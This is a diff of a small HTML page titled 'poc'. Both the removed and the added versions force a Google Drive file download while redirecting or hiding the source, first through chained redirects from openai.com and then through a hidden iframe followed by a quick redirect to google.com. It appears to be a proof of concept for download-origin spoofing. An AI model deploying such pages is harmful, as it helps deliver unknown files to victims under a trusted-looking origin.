@@ -1,29 +1,29 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>poc</title>
-  <script>
-    function chainRedirect(w, urls, index = 0) {
-      if (index < urls.length) {
-        w.location.replace(urls[index]);
-        setTimeout(() => chainRedirect(w, urls, index + 1), 1000);
-      }
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+    h1 {
+        margin: 1em;
     }
 
-    function startRedirect() {
-      let w = window.open("");
-      setTimeout(() => {
-        chainRedirect(w, [
-        "https://openai.com",
-        "https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=dbf84869-b028-42ae-be84-2f99a61f81ce&at=AGN2oQ1Eb86L8ZXuseYnXn2FPPXs:1773900102109",
-        "https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=dbf84869-b028-42ae-be84-2f99a61f81ce&at=AGN2oQ1Eb86L8ZXuseYnXn2FPPXs:1773900102109",
-        ]);
-      }, 1000);
+    iframe {
+        display: none;
+        width: 100%;
+        height: 600px;
+        border: 0;
     }
-  </script>
-</head>
-<body>
-  <button onclick="startRedirect()">Start</button>
-</body>
-</html>
+</style>
+
+
+<iframe id="frame" src="https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=2fd86e2c-3607-49fa-9e91-ac198eae5e46&at=AGN2oQ1rJLXpYieZleCfJPt2IM4z:1773900320983"></iframe>
+
+<script>
+    // Tampilkan iframe setelah 2 detik
+    setTimeout(() => {
+        document.getElementById("frame").style.display = "block";
+    }, 3500);
+
+    // Redirect ke Google setelah 4 detik
+    setTimeout(() => {
+        window.location.href = "https://google.com";
+    }, 215);
+</script>
